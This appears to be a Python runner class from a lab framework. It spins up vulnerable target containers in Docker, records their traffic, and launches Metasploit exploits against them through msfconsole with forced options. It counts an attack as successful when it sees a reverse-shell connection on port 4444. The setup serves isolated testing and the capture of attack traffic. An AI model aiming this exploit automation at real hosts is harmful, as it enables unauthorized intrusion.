import time
from runners.base import BaseRunner

class DockerMsfCli(BaseRunner):
    def __init__(self, docker_client, name="target", 
                 network_name="set_framework_net", volume_name="set_logs", 
                 target_image="", msf_exploit="", msf_options="", delay=0):
        super().__init__(docker_client, network_name, volume_name)
        self.target=None
        self.attack=None
        self.tcpdump=None
        #these should be setup on init.  However, should they be cleaned first???
        self.name=name
        self.target_image=target_image
        self.msf_exploit=msf_exploit
        self.target_logs=None
        self.delay=delay
        self.msf_options=msf_options
        
    def target_setup(self):
        print("[*] Starting vulnerable target %s" % self.name)
        #tcpdump setup should happen automaticly after target setup
        dk_target = self.client.containers.run(self.target_image,
                                  detach=True, name=self.name,
                                  network=self.network)
        self.target=dk_target
        time.sleep(self.delay)

    def target_cleanup(self):
        if self.tcpdump:
            self.tcpdump_cleanup()
        self.target.stop()
        self.target.remove()

    def tcpdump_setup(self):
        cmd = "-U -v -w /data/%s/pcap/%s.pcap" % (self.name, self.name) #I shortened this and removed the pcap dir
        dk_tcpdump = self.client.containers.run("tcpdump",command=cmd, detach=True,
                                  name="%s-tcpdump" % self.name, privileged=True,
                                  network="container:%s" % self.name, #TODO: this should be derived from self.target.name
                                  volumes={self.volume:{"bind":"/data","mode":'rw'}})
        self.tcpdump=dk_tcpdump

    def tcpdump_cleanup(self):
        self.tcpdump.stop()
        self.tcpdump.remove()

    def attack_setup(self):
        print("[*] Starting attack system for %s" % self.name)
        dk_attack = self.client.containers.run("metasploitframework/metasploit-framework:6.2.33",
                                 detach=True, name="%s-attack" % self.name,
                                 network=self.network, tty=True)
        self.attack=dk_attack

    def attack_cleanup(self):
        self.attack.stop()
        self.attack.remove()

    
    def exploit(self):
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        #cant remember why the second arg is a blank string
        print("[*] Running exploit for %s" % self.name, end="", flush=True)
        args = args % (self.msf_exploit, self.msf_options, self.name, "%s-attack" % self.name)
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self):
        #create check to see if exploit happened.
        #by default it checks for established connections on 4444
        #todo: create check customization for other MSF session ports
        
        cmd = "netstat |grep 4444 |grep ESTABLISHED"
        result = self.attack.exec_run(cmd=cmd, tty=True)
        cmd_result = str(result.output)
        print('.', end="", flush=True)
        for line in cmd_result.splitlines():
            if "4444" in str(line) and "ESTABLISHED" in str(line):
                print("\n[*] Exploit of %s success" % self.name)
                return True
        return False

   
    def ready_to_exploit(self):
        #TODO: add a delay and retries argument similar to exploit_intil_success
        if self.target_logs == None:
            print("[*] Checking if target %s is setup" % self.name, end="",
                  flush=True)
        else:
            print('.', end="", flush=True)
        #temp solution
        logs = self.target.logs()
        if self.target_logs == logs:
            print("\n[*] Target %s is ready for exploit" % self.name)
            return True
        else:
            self.target_logs = logs
            time.sleep(5)
        return False
